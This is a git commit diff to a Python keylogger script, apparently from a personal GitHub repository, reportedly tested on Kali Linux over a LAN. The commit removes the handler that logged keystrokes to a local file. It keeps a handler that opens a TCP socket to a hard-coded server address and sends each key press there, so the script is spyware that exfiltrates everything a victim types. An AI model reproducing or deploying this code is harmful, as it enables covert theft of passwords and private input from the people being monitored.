abaf6e89540affd24d518a05e334512ab5f43b2e
Debangshu <114200360+Debang5hu@users.noreply.github.com>
2023-11-10 00:09:00 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 # _*_ coding: utf-8 _*_
-#tested on linux (Linux kali 6.5.0-kali2-amd64)
+#tested on linux (Linux kali 6.5.0-kali2-amd64) and in LAN
 
 
 try:
@@ -13,35 +13,15 @@ except:
 # <-- Intializing global values -->
 
 #replace the ip with your server's ip 
-SERVER_ADDRESS = '192.168.29.54:9090'.split(':')
+
+#LAN (it establish a tcp connection for sending data)
+SERVER_ADDRESS = '192.168.29.222:9090'.split(':')
+
         
 #keystroke record
 class keylogger:
     def Keylogging(self):
-        
-        def on_key_release(key):
-            try:            
-                with open('keystrokes.txt','a+') as fh:
-                    fh.write(f'{key.char}')
-            except:
-                with open('keystrokes.txt','a+') as fh:
-                    key=str(key)
 
-                    if key == 'Key.space':
-                        fh.write(' ')
-
-                    elif key == 'Key.shift' or key == 'Key.shift_r': 
-                        pass
-                    
-                    elif key == 'Key.ctrl': 
-                        fh.write('\nctrl + ')
-
-                    elif key == 'Key.enter':
-                        fh.write('\n')
-                    
-                    else:
-                        fh.write(f'\n{key}\n')
-        
         def on_key_press(key):
             server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             server.connect((SERVER_ADDRESS[0],int(SERVER_ADDRESS[-1])))
@@ -49,7 +29,7 @@ class keylogger:
             server.close()
 
         # Create listener objects
-        with keyboard.Listener(on_press=on_key_press , on_release=on_key_release) as listener:
+        with keyboard.Listener(on_press=on_key_press) as listener:
             listener.join()
 
 
